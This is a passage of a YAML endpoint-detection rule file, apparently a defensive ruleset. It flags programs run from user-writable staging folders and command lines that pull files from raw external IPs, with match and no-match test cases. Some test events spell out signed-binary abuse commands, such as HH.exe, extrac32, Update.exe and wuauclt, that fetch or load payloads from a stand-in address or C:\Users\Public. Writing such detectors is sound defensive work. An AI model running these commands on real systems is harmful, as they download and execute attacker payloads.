      - {field: command_line, regex: '(\\users\\public\\|\\windows\\temp\\|\\appdata\\(local\\temp|roaming|local)\\|\\programdata\\|\\users\\\S{1,30}\\(downloads|desktop|documents)\\|%temp%|%tmp%|%appdata%|%localappdata%|%public%|\\perflogs\\|\\\$recycle\.bin\\)\S{0,100}\.(exe|dll|bat|cmd|ps1|vbs|vbe|js|jse|hta|sct|wsc|xml|xsl|inf|bgi|cab|ocx|cpl|scr|lnk|wds|cs|vb|csproj|dat|bin|cmd)\b'}
      - not: {field: command_line, regex: '(^|[\\/\s"''])(sc|reg|schtasks|netsh|wmic|findstr)(\.exe)?("|'')?\s+(query|show|list|/query|get|help|/\?)\b'}
  tests:
    - {event: {command_line: 'runexehelper.exe C:\Users\Public\payload.exe'}, expect_match: true}
    - {event: {command_line: 'wuauclt.exe /UpdateDeploymentProvider C:\Users\Public\payload.dll /RunHandlerComServer'}, expect_match: true}
    - {event: {command_line: 'bginfo.exe C:\Users\Public\payload.bgi /popup /nolicprompt'}, expect_match: true}
    - {event: {command_line: 'csc.exe -out:C:\Users\Public\payload.exe C:\Users\Public\payload.cs'}, expect_match: true}
    - {name: build of a project outside staging, event: {command_line: 'msbuild C:\src\app\app.csproj /p:Configuration=Release'}, expect_match: false}
    - {name: vendor control registered from Program Files, event: {command_line: 'regsvr32 /s "C:\Program Files\Vendor\ctl.ocx"'}, expect_match: false}
    - {name: querying a service, event: {command_line: 'sc query spooler'}, expect_match: false}
    - {name: a script run by name, event: {command_line: 'dotnet build C:\src\app.sln'}, expect_match: false}

- id: TB-EXEC-017
  name: Command line fetches from, or executes on, a raw external IP address (URL or SMB path)
  severity: medium
  confidence: 60
  techniques: [T1105, T1204, T1218]
  tags: [ingress-tool-transfer, raw-ip]
  tuning: Health checks and scripts that address external IPs directly are rare; allowlist the monitoring hosts that do.
  match:
    any:
      - {field: command_line, regex: '\b(https?|ftps?|tftp)://(?!(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|127\.|169\.254\.|0\.0\.0\.0))(\d{1,3}\.){3}\d{1,3}(:\d{2,5})?(/|\b)'}
      - {field: command_line, regex: '(^|[\s"''=,(])\\\\(?!(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|127\.|169\.254\.))(\d{1,3}\.){3}\d{1,3}\\'}
      - {field: command_line, regex: '/z(https?|ftps?)://(?!(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.))\S{1,100}'}
  tests:
    - {event: {command_line: 'HH.exe http://198.51.100.50/payload.bat'}, expect_match: true}
    - {event: {command_line: 'extrac32 /Y /C \\198.51.100.50\share\payload C:\Users\Public\payload'}, expect_match: true}
    - {event: {command_line: 'Update.exe --update=http://198.51.100.50/payload'}, expect_match: true}
    - {name: internal server, event: {command_line: 'curl http://10.0.4.9:8080/health'}, expect_match: false}
    - {name: named external host, event: {command_line: 'curl https://api.vendor.example/health'}, expect_match: false}
    - {name: loopback, event: {command_line: 'curl http://127.0.0.1:9200/_cluster/health'}, expect_match: false}

